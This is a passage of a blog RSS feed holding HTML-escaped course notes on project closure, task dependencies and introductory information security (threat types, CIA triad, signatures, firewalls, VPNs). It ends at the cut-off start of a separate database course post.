        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Keep track with a graph&lt;/p&gt;
&lt;h3 id=&#34;project-closure&#34; &gt;Project Closure
&lt;span&gt;
    &lt;a href=&#34;#project-closure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Handover deliverables to customer&lt;/li&gt;
&lt;li&gt;Pass the project documentation to the business&lt;/li&gt;
&lt;li&gt;Cancel supplier contracts&lt;/li&gt;
&lt;li&gt;Release staff and equipment&lt;/li&gt;
&lt;li&gt;Inform stakeholders of the closure of the project&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;types-of-dependency&#34; &gt;Types of Dependency
&lt;span&gt;
    &lt;a href=&#34;#types-of-dependency&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Finish to start
&lt;ul&gt;
&lt;li&gt;predecessor must finish&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Finish to finish
&lt;ul&gt;
&lt;li&gt;cannot finish until previous finishes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;start to start
&lt;ul&gt;
&lt;li&gt;cannot start until other starts&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;start to finish
&lt;ul&gt;
&lt;li&gt;cannot finish until other has started&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;managing-information-security&#34; &gt;Managing Information Security
&lt;span&gt;
    &lt;a href=&#34;#managing-information-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Protecting data from unauthorized access, use, disclosure, disruption, modification, or destruction.&lt;/li&gt;
&lt;li&gt;Integrity: accurate and reliable and authorization&lt;/li&gt;
&lt;li&gt;Availability: information is accessible by authorized individuals&lt;/li&gt;
&lt;li&gt;Confidentiality: protection from the unauthorized&lt;/li&gt;
&lt;li&gt;Protecting intellectual property, sensitive customer data, and internal communication are vital for maintaining trust, compliance, competitive advantage, and ultimately, business survival.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-information-security&#34; &gt;What is Information Security?
&lt;span&gt;
    &lt;a href=&#34;#what-is-information-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Information security aims to maintain the confidentiality, integrity, and availability of data in all its forms.&lt;/li&gt;
&lt;li&gt;Another crucial objective is ensuring Business Continuity (the ability of the organization to continue operations even in the event of security breaches or disasters).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-threats&#34; &gt;Security Threats
&lt;span&gt;
    &lt;a href=&#34;#security-threats&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Software attacks like computer viruses, computer worms, malware, and ransomware&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trojan: appears to be legitimate and not harmful but then does something unexpected (downloaded malicious file)&lt;/li&gt;
&lt;li&gt;Worms: replicate copies, standalone, do not need host program or human help to activate or propogate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Identity theft&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fraudulent acquisition and use of another&amp;rsquo;s private information&lt;/li&gt;
&lt;li&gt;phishing&lt;/li&gt;
&lt;li&gt;data breaches&lt;/li&gt;
&lt;li&gt;Website spoofing: Man in the middle attack (certificate not valid)&lt;/li&gt;
&lt;li&gt;DNS Spoofing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Intellectual property (IP) theft&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;underlying tech&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sabotage, information extortion, or equipment theft&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ransomware&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sobeys hit with Black Basta&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Advanced persistent threats (APTs) involve long-term targeted attacks on specific organizations.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Internet of things (IoT) creates new vulnerabilities, cloud storage&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-management&#34; &gt;Security Management
&lt;span&gt;
    &lt;a href=&#34;#security-management&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Personnel security: authorization
&lt;ul&gt;
&lt;li&gt;ensuring that only authorized individuals can access an organization&amp;rsquo;s sensitive information and systems.&lt;/li&gt;
&lt;li&gt;background checks, security awareness training&lt;/li&gt;
&lt;li&gt;humans can be the weakest link&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Application security: fixing security vulnerabilities
&lt;ul&gt;
&lt;li&gt;vulnerability scanning, code review, and penetration testing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Operating system (OS) security: protect the OS
&lt;ul&gt;
&lt;li&gt;anti-virus&lt;/li&gt;
&lt;li&gt;updating&lt;/li&gt;
&lt;li&gt;OS is the backbone&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Network security: prevent and monitor misuse of network
&lt;ul&gt;
&lt;li&gt;intrusion, modification, destruction, or unauthorized access.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web services security: protocols and encryption
&lt;ul&gt;
&lt;li&gt;secure communication&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facility security: physical security of the premises
&lt;ul&gt;
&lt;li&gt;surveillance systems, secure access controls, and alarm systems.&lt;/li&gt;
&lt;li&gt;often overlooked&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;equifax&#34; &gt;Equifax
&lt;span&gt;
    &lt;a href=&#34;#equifax&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Setting strict standards for data protection similar to PIPEDA
&lt;ul&gt;
&lt;li&gt;regular audits&lt;/li&gt;
&lt;li&gt;encryption&lt;/li&gt;
&lt;li&gt;robust disaster recovery&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transparency&lt;/li&gt;
&lt;li&gt;Accountability&lt;/li&gt;
&lt;li&gt;Regular updates&lt;/li&gt;
&lt;li&gt;Action&lt;/li&gt;
&lt;li&gt;Support&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;five-pillars&#34; &gt;Five Pillars
&lt;span&gt;
    &lt;a href=&#34;#five-pillars&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Authentication
&lt;ul&gt;
&lt;li&gt;verify user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Identification
&lt;ul&gt;
&lt;li&gt;Granting appropriate access&lt;/li&gt;
&lt;li&gt;Web cookie: read only be webserver for domain issuer
&lt;ul&gt;
&lt;li&gt;Session: browser&amp;rsquo;s temporary  subfolder&lt;/li&gt;
&lt;li&gt;Persistent: permanent in browser&amp;rsquo;s subfolder&lt;/li&gt;
&lt;li&gt;First party: site visits&lt;/li&gt;
&lt;li&gt;Third party: come from website you aren&amp;rsquo;t visiting (advertisements usually)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Privacy&lt;/li&gt;
&lt;li&gt;Integrity
&lt;ul&gt;
&lt;li&gt;Ensure trustworthiness of data (consistent, accurate, unaltered)&lt;/li&gt;
&lt;li&gt;Checksum (hash functions, message digests) fixed-size, unique output values from input data of any size
&lt;ul&gt;
&lt;li&gt;verify integrity and authenticity of data by detecting any changes or tampering&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Non-repudiation
&lt;ul&gt;
&lt;li&gt;Ensure that no party can deny that their signature is on sent/received data&lt;/li&gt;
&lt;li&gt;provides assurance&lt;/li&gt;
&lt;li&gt;Digital signature
&lt;ul&gt;
&lt;li&gt;cryptographic mechnism&lt;/li&gt;
&lt;li&gt;ensure sender is verified&lt;/li&gt;
&lt;li&gt;public-key cryptography
&lt;ul&gt;
&lt;li&gt;private key used to sign, public key verifies&lt;/li&gt;
&lt;li&gt;only sender can use the private key&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Symmetric (SKE) vs. Asymmetric
&lt;ul&gt;
&lt;li&gt;Symmetric: same key is used for encrypting and decrypting&lt;/li&gt;
&lt;li&gt;Asymmetric: pair of private and public keys
&lt;ul&gt;
&lt;li&gt;often used for generating signatures&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Digital cert
&lt;ul&gt;
&lt;li&gt;uses a trusted third party known as a certificate authority (CA).&lt;/li&gt;
&lt;li&gt;CA generates an encrypted digital certificate containing owner identification information and a copy of the owner’s public key&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;technical-countermeasures&#34; &gt;Technical Countermeasures
&lt;span&gt;
    &lt;a href=&#34;#technical-countermeasures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;hardware or software tools and techniques used to protect information and data from security threats&lt;/li&gt;
&lt;li&gt;Firewalls, Encryption/Decryption, Steganography and Virtual Private Networks (VPNs)&lt;/li&gt;
&lt;li&gt;Firewall
&lt;ul&gt;
&lt;li&gt;controls incoming and outgoing data transmissions&lt;/li&gt;
&lt;li&gt;allows authorized communication and denies unauthorized access&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;steganography&#34; &gt;Steganography
&lt;span&gt;
    &lt;a href=&#34;#steganography&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hides the existence of a message
&lt;ul&gt;
&lt;li&gt;Hiding data in graphic images or sound file&lt;/li&gt;
&lt;li&gt;Concealed messages in tampered executable files&lt;/li&gt;
&lt;li&gt;Pictures embedded in video material&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;virtual-private-network-vpn&#34; &gt;Virtual Private Network (VPN)
&lt;span&gt;
    &lt;a href=&#34;#virtual-private-network-vpn&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;VPN technology creates a secure and encrypted connection between a user&amp;rsquo;s device and the internet&lt;/li&gt;
&lt;li&gt;route traffic through remote server operated by VPN provider&lt;/li&gt;
&lt;li&gt;Need for inexpensive but secure connections between distant locations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;intranet&#34; &gt;Intranet
&lt;span&gt;
    &lt;a href=&#34;#intranet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;internal network&lt;/li&gt;
&lt;li&gt;centralized hub&lt;/li&gt;
&lt;li&gt;secure platform where employees can access important company news, updates, policies, and procedures&lt;/li&gt;
&lt;li&gt;repository for documents&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;management-countermeasures&#34; &gt;Management Countermeasures
&lt;span&gt;
    &lt;a href=&#34;#management-countermeasures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Computer Auditing, Computer Monitoring, and Economic Evaluation of Security Measures.&lt;/li&gt;
&lt;li&gt;Balance security with business needs&lt;/li&gt;
&lt;li&gt;Computer auditing
&lt;ul&gt;
&lt;li&gt;assess and inspect&lt;/li&gt;
&lt;li&gt;verify system logs, access controls, and data integrity measures&lt;/li&gt;
&lt;li&gt;reduces risks of data breaches&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Computer Monitoring
&lt;ul&gt;
&lt;li&gt;within an organization&amp;rsquo;s network&lt;/li&gt;
&lt;li&gt;detect any irregular behavior&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;examples&#34; &gt;Examples
&lt;span&gt;
    &lt;a href=&#34;#examples&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cyberattacks on USA Energy Grid (CNN)&lt;/li&gt;
&lt;li&gt;DDoS attack on Los Angeles County and Salt Lake City&lt;/li&gt;
&lt;li&gt;DDoS using botnet&lt;/li&gt;
&lt;li&gt;Performing a Cybersecurity Audit of an Electric Power Transmission Systems Operator&lt;/li&gt;
&lt;li&gt;Meta&amp;rsquo;s Threads App
&lt;ul&gt;
&lt;li&gt;Potential trade secrets lawsuit by Twitter&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;economic-evaluation-of-security-measures&#34; &gt;Economic Evaluation of Security Measures
&lt;span&gt;
    &lt;a href=&#34;#economic-evaluation-of-security-measures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;balance between lost and cost to fix&lt;/li&gt;
&lt;li&gt;assess direct costs (purchases) and indirect (employee training, downtimes)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;risk-management&#34; &gt;RIsk Management
&lt;span&gt;
    &lt;a href=&#34;#risk-management&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h2 id=&#34;centric&#34; &gt;Centric
&lt;span&gt;
    &lt;a href=&#34;#centric&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;information-centric-decision-making&#34; &gt;Information-Centric Decision Making
&lt;span&gt;
    &lt;a href=&#34;#information-centric-decision-making&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;accurate, relevant, information and analytical tools to make decisions based on insights rather than intuition&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CS 348 Intro to Database Management</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-348-intro-to-database-management/</link>
      <pubDate>Tue, 10 Jan 2023 16:02:06 -0500</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-348-intro-to-database-management/</guid>
      <description>&lt;div&gt;
    &lt;h2&gt;Table of Contents&lt;/h2&gt;
    &lt;nav id=&#34;TableOfContents&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&#34;#objectives&#34;&gt;Objectives&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#viewpoints&#34;&gt;Viewpoints&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sub-objectives&#34;&gt;Sub-objectives&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#file-processing-systems&#34;&gt;File-Processing Systems&lt;/a&gt;
      &lt;ul&gt;
